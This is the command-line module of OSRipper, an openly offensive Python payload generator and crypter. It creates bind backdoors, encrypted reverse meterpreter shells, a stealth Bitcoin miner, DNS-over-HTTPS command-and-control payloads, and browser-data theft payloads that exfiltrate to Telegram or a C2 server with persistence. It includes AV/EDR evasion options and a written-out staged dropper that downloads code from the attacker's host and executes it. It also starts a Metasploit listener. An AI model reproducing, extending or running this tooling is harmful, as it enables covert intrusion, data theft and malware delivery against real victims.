#!/usr/bin/env python3
"""
OSRipper CLI Interface
Advanced command-line interface for OSRipper payload generator
"""

import argparse
import sys
import os
from pathlib import Path
import json

# Import main functionality - import module directly using importlib to bypass __init__.py
import importlib.util
import sys
_main_module_path = __file__.replace('cli.py', 'main.py')
_spec = importlib.util.spec_from_file_location("osripper.main", _main_module_path)
main_module = importlib.util.module_from_spec(_spec)
_spec.loader.exec_module(main_module)

from . import __version__
# Import main function separately for interactive mode
from .main import main as main_function

def create_parser():
    """Create and configure argument parser."""
    parser = argparse.ArgumentParser(
        description=f"OSRipper v{__version__} - Advanced Payload Generator & Crypter",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Common Options (available for most commands):
  --obfuscate           Obfuscate the generated payload using multi-layer encoding
  --enhanced            Use enhanced obfuscator with anti-debug, VM detection, and 
                        advanced evasion techniques (requires --obfuscate)
  --compile             Compile payload to standalone binary using Nuitka
  --icon PATH           Custom icon file (.ico) for compiled binary
  --delay               Add random delay (5-15 seconds) at startup for stealth
  --output, -o NAME     Output filename (default: payload)
  --quiet, -q           Quiet mode - minimal output

Examples:
  %(prog)s bind -p 4444                          # Create bind backdoor on port 4444
  %(prog)s reverse -H 192.168.1.100 -p 4444     # Create reverse shell
  %(prog)s reverse --ngrok -p 4444               # Use ngrok tunneling
  %(prog)s miner is deprecated for now. standby for updates
  %(prog)s custom --script malware.py           # Encrypt custom script
  %(prog)s staged -H 192.168.1.100 -p 8080      # Create staged payload
  %(prog)s doh -d example.com                   # Create DoH C2 payload
  %(prog)s server example.com                   # Start C2 server
  %(prog)s server example.com --https           # Start C2 server with HTTPS
  %(prog)s setup                                # Install optional deps (ngrok, compile)
  
  # Advanced options with obfuscation and compilation
  %(prog)s reverse -H 192.168.1.100 -p 4444 --obfuscate --enhanced --compile --icon app.ico --delay

For detailed help on a specific command, run:
  %(prog)s <command> -h
        """)
    
    # Global options (only version and config stay global)
    parser.add_argument('-v', '--version', action='version', 
                       version=f'OSRipper v{__version__}')
    parser.add_argument('--config', help='Configuration file path')
    
    # Subcommands
    subparsers = parser.add_subparsers(dest='command', help='Available commands')
    
    # Helper function to add common options to subparsers
    def add_common_options(subparser):
        """Add common options to a subparser."""
        subparser.add_argument('--output', '-o', default='payload',
                             help='Output filename (default: payload)')
        subparser.add_argument('--obfuscate', action='store_true',
                             help='Obfuscate the generated payload')
        subparser.add_argument('--enhanced', action='store_true',
                             help='Use enhanced obfuscator with anti-debug, VM detection, junk code, and advanced evasion techniques (requires --obfuscate)')
        subparser.add_argument('--compile', action='store_true',
                             help='Compile payload to binary')
        subparser.add_argument('--icon', help='Icon file for compiled binary')
        subparser.add_argument('--delay', action='store_true',
                             help='Add random delay (5-15 seconds) at startup for stealth. This is useful for evading AV/EDR detection.')
        subparser.add_argument('--no-randomize-output', action='store_true',
                             help='Disable random obfuscated filename (default with --obfuscate/--enhanced is to use a random suffix)')
        subparser.add_argument('--quiet', '-q', action='store_true',
                             help='Quiet mode - minimal output')
    
    # Bind backdoor
    bind_parser = subparsers.add_parser('bind', 
                                       help='Create bind backdoor',
                                       description='Create a bind backdoor that opens a port on the victim machine and waits for connection')
    bind_parser.add_argument('-p', '--port', required=True, type=int,
                           help='Port to bind to (1024-65535)')
    add_common_options(bind_parser)
    
    # Reverse shell
    reverse_parser = subparsers.add_parser('reverse', 
                                          help='Create reverse shell',
                                          description='Create encrypted reverse TCP meterpreter with SSL/TLS encryption')
    reverse_group = reverse_parser.add_mutually_exclusive_group(required=True)
    reverse_group.add_argument('--ngrok', action='store_true',
                             help='Use ngrok tunneling for dynamic IP/port')
    reverse_group.add_argument('-H', '--host', help='Callback IP address')
    reverse_parser.add_argument('-p', '--port', required=True, type=int,
                              help='Callback port (1024-65535)')
    add_common_options(reverse_parser)
    
    # BTC Miner
    miner_parser = subparsers.add_parser('miner', 
                                        help='Create BTC miner',
                                        description='Create stealthy cryptocurrency mining payload (deprecated)')
    miner_parser.add_argument('--address', required=True,
                            help='Bitcoin payout address (26-35 characters)')
    add_common_options(miner_parser)
    
    # Custom crypter
    custom_parser = subparsers.add_parser('custom', 
                                         help='Encrypt custom script',
                                         description='Obfuscate and encrypt existing Python scripts')
    custom_parser.add_argument('--script', required=True,
                             help='Path to Python script (.py) to encrypt')
    add_common_options(custom_parser)
    
    # Staged payload
    staged_parser = subparsers.add_parser('staged', 
                                         help='Create staged payload',
                                         description='Create multi-stage web delivery payload with enhanced stealth')
    staged_group = staged_parser.add_mutually_exclusive_group(required=True)
    staged_group.add_argument('--ngrok', action='store_true',
                            help='Use ngrok tunneling for dynamic IP/port')
    staged_group.add_argument('-H', '--host', help='Callback IP address')
    staged_parser.add_argument('-p', '--port', required=True, type=int,
                             help='Callback port (1024-65535)')
    add_common_options(staged_parser)
    
    # DoH payload
    doh_parser = subparsers.add_parser('doh', 
                                       help='Create DNS-over-HTTPS C2 payload',
                                       description='Create stealthy DNS-over-HTTPS C2 payload with web UI')
    doh_parser.add_argument('-d', '--domain', required=True,
                           help='C2 domain name (e.g., example.com)')
    add_common_options(doh_parser)
    
    # Exfil payload (browser data extraction)
    exfil_parser = subparsers.add_parser('exfil',
                                         help='Create browser data extraction payload',
                                         description='Generate platform-specific browser data extraction payload '
                                                     'with Telegram and/or OSRipper C2 exfiltration')
    exfil_parser.add_argument('--platform', '-P', required=True,
                              choices=['windows', 'linux', 'wsl2', 'android'],
                              help='Target platform')
    exfil_parser.add_argument('--bot-token', '-T',
                              help='Telegram bot token (required for telegram/dual mode)')
    exfil_parser.add_argument('--chat-id', '-C',
                              help='Telegram chat ID (required for telegram/dual mode)')
    exfil_parser.add_argument('--c2-url',
                              help='OSRipper C2 server URL (required for c2/dual mode)')
    exfil_parser.add_argument('--c2-mode', default='telegram',
                              choices=['telegram', 'c2', 'dual'],
                              help='Exfiltration mode (default: telegram)')
    exfil_parser.add_argument('--interval', type=int, default=3600,
                              help='Auto-extraction interval in seconds (0=disabled, default: 3600)')
    exfil_parser.add_argument('--no-persist', action='store_true',
                              help='Disable auto-persistence on target')
    exfil_parser.add_argument('--root', action='store_true',
                              help='Enable root mode (Android only)')
    add_common_options(exfil_parser)

    # Interactive mode
    interactive_parser = subparsers.add_parser('interactive', 
                                              help='Interactive mode',
                                              description='Launch interactive menu-driven interface')
    
    # C2 Server
    server_parser = subparsers.add_parser('server', 
                                         help='Start C2 server',
                                         description='Start OSRipper C2 server with web UI for managing DoH and HTTPS payloads')
    server_parser.add_argument('domain', help='C2 domain name (e.g., example.com)')
    server_parser.add_argument('--host', default='0.0.0.0', help='Server host address (default: 0.0.0.0)')
    server_parser.add_argument('--port', type=int, default=5000, help='Server port (default: 5000)')
    server_parser.add_argument('--db', default='c2_sessions.db', help='Database path (default: c2_sessions.db)')
    server_parser.add_argument('--https', action='store_true', help='Enable HTTPS with self-signed certificate')
    server_parser.add_argument('--cert', help='Path to certificate file (for HTTPS, auto-generated if not provided)')
    server_parser.add_argument('--key', help='Path to private key file (for HTTPS, auto-generated if not provided)')
    server_parser.add_argument('--debug', action='store_true', help='Enable Flask debug mode')
    
    # Setup optional dependencies (pyngrok, nuitka, sandboxed)
    setup_parser = subparsers.add_parser('setup',
                                         help='Install optional dependencies (ngrok, binary compilation)',
                                         description='Install optional Python packages required for ngrok tunnel listing and compiling payloads to binaries. Run this if you see "pip install" messages when using --ngrok or --compile.')
    setup_group = setup_parser.add_mutually_exclusive_group()
    setup_group.add_argument('--user', action='store_true',
                             help='Install to user site (default)')
    setup_group.add_argument('--system', action='store_true',
                             help='Install system-wide (may require sudo)')
    
    return parser

def load_config(config_path):
    """Load configuration from file."""
    try:
        with open(config_path, 'r') as f:
            return json.load(f)
    except Exception as e:
        print(f"[!] Error loading config: {e}")
        return {}

def validate_args(args):
    """Validate command line arguments."""
    if args.command in ['bind', 'reverse', 'staged']:
        if not (1024 <= args.port <= 65535):
            print("[!] Port must be between 1024 and 65535")
            return False
    
    if args.command == 'reverse' and args.host:
        try:
            import socket
            socket.inet_aton(args.host)
        except OSError:
            print("[!] Invalid IP address format")
            return False
    
    if args.command == 'custom':
        if not os.path.isfile(args.script):
            print("[!] Script file not found")
            return False
        if not args.script.endswith('.py'):
            print("[!] Script must be a Python file (.py)")
            return False
    
    if args.command == 'miner':
        if not (26 <= len(args.address) <= 35):
            print("[!] Invalid Bitcoin address format")
            return False
    
    if args.command == 'exfil':
        if args.c2_mode in ('telegram', 'dual'):
            if not args.bot_token or not args.chat_id:
                print("[!] --bot-token and --chat-id required for telegram/dual mode")
                return False
        if args.c2_mode in ('c2', 'dual'):
            if not args.c2_url:
                print("[!] --c2-url required for c2/dual mode")
                return False
    
    if args.command == 'setup':
        pass
    elif args.command == 'server':
        # Validate server arguments
        if not (1024 <= args.port <= 65535):
            print("[!] Port must be between 1024 and 65535")
            return False
        if args.cert and not os.path.isfile(args.cert):
            print("[!] Certificate file not found")
            return False
        if args.key and not os.path.isfile(args.key):
            print("[!] Key file not found")
            return False
        if (args.cert and not args.key) or (args.key and not args.cert):
            print("[!] Both --cert and --key must be provided together")
            return False
    
    if hasattr(args, 'icon') and args.icon and not os.path.isfile(args.icon):
        print("[!] Icon file not found")
        return False
    
    return True

def execute_bind(args):
    """Execute bind backdoor generation."""
    from .generator import create_bind_payload
    
    if not args.quiet:
        print(f"[*] Creating bind backdoor on port {args.port}")
    
    # Set global variables for compatibility
    main_module.name = args.output
    main_module.port = str(args.port)
    main_module.bind = "1"
    
    # Generate payload using centralized function
    create_bind_payload(args.port, args.output, stealth_delay=args.delay)
    
    if not args.quiet:
        print(f"[+] Bind backdoor generated: {args.output}")
        print(f"[*] Listening on port: {args.port}")
        if args.delay:
            print("[*] Stealth delay enabled (5-15 seconds)")
        print("[i] Use 'python/meterpreter/bind_tcp' in Metasploit to connect")
    
    return True

def execute_reverse(args):
    """Execute reverse shell generation."""
    from .generator import create_reverse_ssl_tcp_payload
    
    if not args.quiet:
        print("[*] Creating encrypted reverse shell")
    
    # Set global variables
    main_module.name = args.output
    main_module.bind = 0
    
    if args.ngrok:
        if not args.quiet:
            print(f"[*] Setting up ngrok tunnel on port {args.port}")
        try:
            from .ripgrok import get_tunnels
            print(f"Please run: ngrok tcp {args.port}")
            input("Press Enter when ngrok is ready...")
            tunnel_info = get_tunnels()
            main_module.host, main_module.port = tunnel_info.split(":")
            if not args.quiet:
                print(f"[+] Ngrok tunnel: {main_module.host}:{main_module.port}")
        except Exception as e:
            print(f"[!] Ngrok setup failed: {e}")
            return False
    else:
        main_module.host = args.host
        main_module.port = str(args.port)
    
    # Generate payload using centralized function
    create_reverse_ssl_tcp_payload(main_module.host, main_module.port, args.output, stealth_delay=args.delay)
    
    if not args.quiet:
        print(f"[+] Reverse TCP meterpreter generated: {args.output}")
        print(f"[*] Callback: {main_module.host}:{main_module.port}")
        if args.delay:
            print("[*] Stealth delay enabled (5-15 seconds)")
    
    return True

def execute_miner(args):
    """Execute BTC miner generation."""
    from .generator import create_btc_miner_payload
    
    if not args.quiet:
        print(f"[*] Creating BTC miner for address: {args.address}")
    
    # Set global variables
    main_module.name = args.output
    
    # Generate miner using centralized function
    create_btc_miner_payload(args.address, args.output, stealth_delay=args.delay)
    
    if not args.quiet:
        print(f"[+] BTC miner generated: {args.output}")
        print(f"[*] Payout address: {args.address}")
        if args.delay:
            print("[*] Stealth delay enabled (5-15 seconds)")
        print("[i] Monitor at: https://solo.ckpool.org/")
    
    return True

def execute_custom(args):
    """Execute custom script encryption."""
    from .generator import create_custom_payload
    
    if not args.quiet:
        print(f"[*] Encrypting custom script: {args.script}")
    
    # Set global variables
    main_module.name = args.output
    
    try:
        # Use centralized generator
        create_custom_payload(args.script, args.output, stealth_delay=args.delay)
        
        if not args.quiet:
            print(f"[+] Custom script processed: {args.output}")
            if args.delay:
                print("[*] Stealth delay enabled (5-15 seconds)")
        
        return True
        
    except Exception as e:
        print(f"[!] Error processing script: {e}")
        return False

def execute_staged(args):
    """Execute staged payload generation (reverse payload only; move/dropper done after post_process)."""
    if not args.quiet:
        print("[*] Creating staged payload")
    # Create the main payload; webroot move and dropper are done after post_process in main_cli
    return execute_reverse(args)


def _staged_post_process(args):
    """Move payload to webroot, create dropper, and start web server. Call after post_process for staged command."""
    import shutil
    payload_file = f"{args.output}_or.py" if main_module.encrypted else f"{args.output}.py"
    results_dir = os.path.abspath(os.path.join(os.getcwd(), "results"))
    payload_in_results = os.path.join(results_dir, payload_file)
    source = payload_in_results if os.path.exists(payload_in_results) else os.path.abspath(payload_file)
    os.makedirs("webroot", exist_ok=True)
    if os.path.exists(source):
        shutil.move(source, f"webroot/{payload_file}")
    dropper_code = f'''
import requests
import time
import random

def download_and_execute():
    try:
        url = "http://{main_module.host}:8000/{payload_file}"
        time.sleep(random.randint(1, 10))
        
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            exec(response.text)
        else:
            time.sleep(300)
            download_and_execute()
    except Exception:
        time.sleep(300)
        download_and_execute()

if __name__ == "__main__":
    download_and_execute()
'''
    with open("dropper.py", 'w') as f:
        f.write(dropper_code)
    os.makedirs(results_dir, exist_ok=True)
    shutil.move("dropper.py", os.path.join(results_dir, "dropper.py"))
    main_module.start_web_server("webroot")
    if not args.quiet:
        print("[+] Staged payload created")
        print("[*] Dropper: results/dropper.py")
        print("[*] Web server started on port 8000")

def execute_doh(args):
    """Execute DoH payload generation."""
    from .generator import create_doh_payload
    
    if not args.quiet:
        print(f"[*] Creating DNS-over-HTTPS C2 payload for domain: {args.domain}")
    
    # Set global variables
    main_module.name = args.output
    
    # Generate DoH payload
    create_doh_payload(args.domain, args.output, stealth_delay=args.delay)
    
    if not args.quiet:
        print(f"[+] DoH payload generated: {args.output}")
        print(f"[*] C2 Domain: {args.domain}")
        if args.delay:
            print("[*] Stealth delay enabled (5-15 seconds)")
        print("[i] Start C2 server with: osripper-cli server <domain>")
        print("[i] Web UI will be available at: http://localhost:5000")
    
    return True

def execute_exfil(args):
    """Execute browser extraction payload generation."""
    from .generator import create_exfil_payload

    if args.c2_mode in ('telegram', 'dual'):
        if not args.bot_token or not args.chat_id:
            print("[!] --bot-token and --chat-id are required for telegram/dual mode")
            return False
    if args.c2_mode in ('c2', 'dual'):
        if not args.c2_url:
            print("[!] --c2-url is required for c2/dual mode")
            return False

    if not args.quiet:
        print(f"[*] Creating {args.platform} browser extraction payload")
        print(f"[*] C2 mode: {args.c2_mode}")

    main_module.name = args.output

    create_exfil_payload(
        target_platform=args.platform,
        output_name=args.output,
        bot_token=args.bot_token or '',
        chat_id=args.chat_id or '',
        c2_url=args.c2_url or '',
        c2_mode=args.c2_mode,
        check_interval=args.interval,
        auto_persist=not args.no_persist,
        root_mode=args.root,
        stealth_delay=args.delay,
    )

    if not args.quiet:
        print(f"[+] Exfil payload generated: {args.output}")
        print(f"[*] Target: {args.platform}")
        if args.c2_mode in ('telegram', 'dual'):
            print(f"[*] Telegram: {args.bot_token[:20]}...")
        if args.c2_mode in ('c2', 'dual'):
            print(f"[*] C2 URL: {args.c2_url}")
        if args.delay:
            print("[*] Stealth delay enabled")

    return True


def execute_server(args):
    """Execute C2 server startup."""
    from .c2.server import C2Server
    
    if not args.quiet:
        print(f"[*] Starting OSRipper C2 Server")
        print(f"[*] Domain: {args.domain}")
        print(f"[*] Host: {args.host}")
        print(f"[*] Port: {args.port}")
        if args.https:
            print(f"[*] HTTPS: Enabled")
        print(f"[*] Database: {args.db}")
    
    try:
        # Create and run server
        server = C2Server(
            domain=args.domain,
            db_path=args.db,
            host=args.host,
            port=args.port,
            use_https=args.https,
            cert_file=args.cert,
            key_file=args.key
        )
        
        if not args.quiet:
            protocol = 'https' if args.https else 'http'
            print(f"\n[+] C2 Server starting...")
            print(f"[*] Web UI: {protocol}://{args.host}:{args.port}")
            print(f"[*] DoH endpoint: {protocol}://{args.host}:{args.port}/dns-query")
            print(f"[*] Press Ctrl+C to stop the server\n")
        
        # Run server (this blocks)
        server.run(debug=args.debug)
        
        return True
        
    except KeyboardInterrupt:
        if not args.quiet:
            print("\n[*] Server stopped by user")
        return True
    except Exception as e:
        print(f"[!] Server error: {e}")
        import traceback
        traceback.print_exc()
        return False

def post_process(args):
    """Handle post-processing options using centralized Generator."""
    if args.obfuscate or args.compile:
        if args.enhanced and not args.obfuscate:
            print("[!] --enhanced requires --obfuscate flag")
            return
        try:
            from .generator import Generator
            source_file = f"{args.output}.py" if os.path.exists(f"{args.output}.py") else args.output
            generator = Generator(
                source_file=source_file,
                output_name=args.output,
                icon_path=args.icon,
                quiet=args.quiet
            )
            # Default to random obfuscated filename when using --obfuscate or --enhanced
            randomize_output = args.obfuscate and not getattr(args, 'no_randomize_output', False)
            success = generator.generate(
                obfuscate=args.obfuscate,
                compile_binary=args.compile,
                enhanced_obfuscation=args.enhanced,
                randomize_output=randomize_output
            )
            if success:
                main_module.encrypted = args.obfuscate
            else:
                print("[!] Generation failed")
        except Exception as e:
            print(f"[!] Generation error: {e}")

def start_listener_if_needed(args):
    """Start Metasploit listener if needed."""
    if args.command in ['reverse', 'staged'] and not main_module.bind:
        try:
            if not args.quiet:
                print("[*] Starting Metasploit listener...")
            
            cmd = f"msfconsole -q -x 'use multi/handler; set payload python/meterpreter/reverse_tcp_ssl; set LHOST 0.0.0.0; set LPORT {main_module.port}; exploit'"
            os.system(cmd)
            
        except Exception as e:
            print(f"[!] Failed to start listener: {e}")

def execute_setup(args):
    """Create OSRipper venv and install optional dependencies (avoids externally-managed env)."""
    import subprocess
    from .venv_helper import get_venv_dir, venv_exists, _venv_python

    venv_dir = get_venv_dir()
    if getattr(args, 'system', False):
        # System-wide: use --user (may still hit externally-managed)
        cmd = [sys.executable, "-m", "pip", "install", "--user",
               "pyngrok", "nuitka", "sandboxed"]
        print("[*] Installing optional dependencies (pyngrok, nuitka, sandboxed) to user site...")
        print(f"[*] Running: {' '.join(cmd)}")
    else:
        # Create venv and install into it (recommended on Linux)
        if not venv_exists():
            print(f"[*] Creating venv at {venv_dir} ...")
            result = subprocess.run([sys.executable, "-m", "venv", venv_dir])
            if result.returncode != 0:
                print("[!] Failed to create venv. Is venv installed? (python3-venv)")
                return False
        if os.name == "nt":
            pip = os.path.join(venv_dir, "Scripts", "pip.exe")
        else:
            pip = os.path.join(venv_dir, "bin", "pip")
            if not os.path.isfile(pip):
                pip = os.path.join(venv_dir, "bin", "pip3")
        cmd = [pip, "install", "pyngrok", "nuitka", "sandboxed"]
        print("[*] Installing optional dependencies into OSRipper venv (pyngrok, nuitka, sandboxed)...")
        print(f"[*] Running: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd)
        if result.returncode == 0:
            print("[+] Setup complete. You can now use --ngrok and --compile.")
        else:
            print("[!] Some packages may have failed. Try running the command above manually.")
        return result.returncode == 0
    except FileNotFoundError:
        print("[!] pip not found. Install pip or run: python3 -m ensurepip")
        return False


def main_cli():
    """Main CLI entry point."""
    from .venv_helper import ensure_venv_on_path
    ensure_venv_on_path()  # so optional deps (ngrok, sandboxed) are found when not in system

    parser = create_parser()
    
    if len(sys.argv) == 1:
        parser.print_help()
        return
    
    args = parser.parse_args()
    
    # Load config if specified
    if args.config:
        config = load_config(args.config)
        # Apply config values as defaults
        for key, value in config.items():
            if not hasattr(args, key) or getattr(args, key) is None:
                setattr(args, key, value)
    
    # Validate arguments
    if not validate_args(args):
        return
    
    # Handle interactive mode
    if args.command == 'interactive':
        main_function()
        return
    
    # Handle C2 server (runs indefinitely, so handle separately)
    if args.command == 'server':
        success = execute_server(args)
        if not success:
            print("[!] Server failed to start")
        return
    
    # Handle setup (install optional deps)
    if args.command == 'setup':
        success = execute_setup(args)
        sys.exit(0 if success else 1)
    
    # Show banner unless quiet
    if not args.quiet:
        main_module.clear_screen()
        main_module.display_logo()
        print(f"[*] OSRipper CLI v{__version__}")
        print("─" * 50)
    
    # Execute command
    success = False
    
    if args.command == 'bind':
        success = execute_bind(args)
    elif args.command == 'reverse':
        success = execute_reverse(args)
    elif args.command == 'miner':
        success = execute_miner(args)
    elif args.command == 'custom':
        success = execute_custom(args)
    elif args.command == 'staged':
        success = execute_staged(args)
    elif args.command == 'doh':
        success = execute_doh(args)
    elif args.command == 'exfil':
        success = execute_exfil(args)
    
    if not success:
        print("[!] Operation failed")
        return
    
    # Post-processing
    post_process(args)
    
    # Staged: move payload to webroot and create dropper after obfuscation/compile
    if args.command == 'staged':
        _staged_post_process(args)
    
    # Start listener if needed (skip for DoH)
    if args.command != 'doh':
        start_listener_if_needed(args)
    
    if not args.quiet:
        print("\n[+] Operation completed successfully!")
        print("[*] Check the 'results' directory for compiled files")
        print("\nThanks for using OSRipper!")

if __name__ == "__main__":
    main_cli()
